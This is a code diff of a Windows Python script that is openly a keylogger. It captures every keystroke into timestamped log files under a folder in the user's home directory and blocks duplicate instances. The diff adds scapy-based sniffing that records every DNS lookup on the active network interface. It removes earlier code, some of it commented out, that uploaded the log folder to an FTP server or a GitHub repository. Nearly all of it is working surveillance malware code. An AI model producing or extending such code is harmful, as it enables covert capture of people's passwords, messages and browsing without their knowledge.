@@ -1,29 +1,57 @@
 import socket
+
 import os
+
 import win32event
 import win32api
 import winerror
-from dirsync import sync
-import ftplib
+
 import datetime
 import logging
 import logging.handlers
 import keyboard
+
+import netifaces
+import winreg
+
+import scapy.all as scapy
 
 
 
 # get the user name as identifier
 user_name = str(socket.gethostname())
 
+#Getting current active network interface#
+
+# Define a function to get the name of an interface from its GUID
+def get_interface_name(guid):
+    # Open the registry key that contains the mapping
+    reg = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
+    key = winreg.OpenKey(reg, r'SYSTEM\CurrentControlSet\Control\Network\{4d36e972-e325-11ce-bfc1-08002be10318}')
+    # Try to get the subkey that corresponds to the GUID
+    try:
+        subkey = winreg.OpenKey(key, guid + r'\Connection')
+        # Try to get the value that contains the name
+        try:
+            name = winreg.QueryValueEx(subkey, 'Name')[0]
+            # Return the name
+            return name
+        except FileNotFoundError:
+            # If the value is not found, return None
+            return None
+    except FileNotFoundError:
+        # If the subkey is not found, return None
+        return None
+
+active_interface = get_interface_name(netifaces.gateways()['default'][netifaces.AF_INET][1])
 
 #For creating app dir
 home_path = os.path.expanduser("~")
-dir_name = "zrootlogger"
+dir_name = "zlogger"
 dir_path = os.path.join(home_path, dir_name)
 if not os.path.exists(dir_path):
     os.makedirs(dir_path)
 os. chdir(dir_path)
-
 
 
 #disallowing multiple instance
@@ -36,63 +64,8 @@ x=''
 data=''
 count=0
 
-##############################################################################
-
-
-# # Connect to the FTP server and login
-# ftp = ftplib.FTP("ftp.example.com")
-# ftp.login("user_name", "password")
-
-# # Define the source and target paths
-# source_path = dir_path
-# target_path = "/remote/folder/path"
-
-# # Sync the local folder with the remote folder using the "copy" option
-# sync(source_path, target_path, "copy", ftp=ftp)
-
-# # Close the FTP connection
-# ftp.quit()
-
-##############################################################################
-
-import subprocess
-import watchdog.events
-import watchdog.observers
-
-# Define your git user_name, personal access token, and repository name
-user_name = "your_user_name"
-token = "your_token"
-repo_name = "your_repo_name"
-
-# Define your local and remote repository paths
-local_path = "/local/folder/path"
-remote_path = f"https://github.com/{user_name}/{repo_name}"
-
-# Define a handler class that inherits from FileSystemEventHandler
-class GitHandler(watchdog.events.FileSystemEventHandler):
-    # Define a method that is called when a file or directory is created
-    def on_created(self, event):
-        # Change directory to your local repository
-        subprocess.run(["cd", local_path])
-        # Add all files to the staging area
-        subprocess.run(["git", "add", "."])
-        # Commit your changes with a message
-        subprocess.run(["git", "commit", "-m", "New file created"])
-        # Push your changes to your remote repository using your user_name and token
-        subprocess.run(["git", "push", f"https://{user_name}:{token}@{remote_path}"])
-
-# Create an observer object
-observer = watchdog.observers.Observer()
-
-# Create a handler object
-handler = GitHandler()
-
-# Schedule the observer to watch the local directory for changes
-observer.schedule(handler, local_path, recursive=True)
-
-# Start the observer
-observer.start()
-
+# get the current date and time as a string
+current_time = datetime.datetime.now().strftime('-%Y-%m-%d-%H-%M-%S')
 ##############################################################################
 
 ##for word count interval##
@@ -117,20 +90,22 @@ class WordCountHandler(logging.FileHandler):
             # close the current file
             self.close()
             # get the current date and time as a string
-            now = datetime.datetime.now().strftime('-%Y-%m-%d-%H-%M-%S')
+            current_time = datetime.datetime.now().strftime('-%Y-%m-%d-%H-%M-%S')
             # create a new file with a different name based on the date and time without the prefix
-            self.baseFilename = f"log-"+user_name+now+".txt"
+            self.baseFilename = f"log-"+user_name+current_time+".txt"
             # open the new file in append mode
             self.stream = self._open()
         # call the parent emit method to write the record to the file
         super().emit(record)
 
 # create a logger object
-logger = logging.getLogger('my_app')
+keylogger = logging.getLogger('my_app')
 # set the logging level to INFO
-logger.setLevel(logging.INFO)
+keylogger.setLevel(logging.INFO)
+# get the current date and time as a string
+current_time = datetime.datetime.now().strftime('-%Y-%m-%d-%H-%M-%S')
 # create a WordCountHandler object with a word limit of 50 and a filename of 'keylog.txt'
-logHandler = WordCountHandler('log-'+user_name+datetime.datetime.now().strftime('-%Y-%m-%d-%H-%M-%S')+".txt", word_limit=50)
+logHandler = WordCountHandler('keylog-'+user_name+current_time+".txt", word_limit=50)
 
 ##for word count interval##
 
@@ -151,6 +126,7 @@ logHandler = WordCountHandler('log-'+user_name+datetime.datetime.now().strftime(
 
 ############################################################################################
 
+
 # set the logging level to INFO
 logHandler.setLevel(logging.INFO)
 # create a formatter object
@@ -158,7 +134,8 @@ formatter = logging.Formatter('%(message)s')
 # set the formatter for the handler
 logHandler.setFormatter(formatter)
 # add the handler to the logger
-logger.addHandler(logHandler)
+keylogger.addHandler(logHandler)
+
 
 
 # define a callback function to process the keystrokes
@@ -166,10 +143,38 @@ def on_key_press(event):
     # get the name of the pressed key
     key = event.name
     # write the keystroke to the log file
-    logger.info(key)
+    keylogger.info(key)
 
 # hook the keyboard events with the callback function
 keyboard.on_press(on_key_press)
 
 # wait for keyboard events in a loop
-keyboard.wait()
+# keyboard.wait()
+
+
+
+#dns a quary
+
+# get the current date and time as a string
+current_time = datetime.datetime.now().strftime('-%Y-%m-%d-%H-%M-%S')
+# Set up the logging configuration
+logging.basicConfig(filename='dnslog-'+user_name+current_time+'.txt', filemode='a', format='%(asctime)s %(message)s', datefmt='%Y-%m-%d %H:%M:%S', level=logging.INFO)
+
+# Define a function to process each packet
+def process_packet(packet):
+    # Check if the packet has a DNS layer and a DNS response
+    if packet.haslayer(scapy.DNS) and packet[scapy.DNS].qr == 1:
+        # Check if the packet has any answers in the DNS response
+        if packet[scapy.DNS].an is not None:
+            # Loop through each answer in the DNS response
+            for answer in packet[scapy.DNS].an:
+                # Check if the answer is an A record
+                if answer.type == 1:
+                    # Get the domain name and the IP address from the answer
+                    domain = answer.rrname.decode('utf-8')
+                    ip = answer.rdata
+                    # Log the domain name and the IP address
+                    logging.info(f'A record: {domain} -> {ip}')
+
+# Sniff packets on the network interface and pass them to the process_packet function
+scapy.sniff(iface=active_interface, store=False, prn=process_packet)
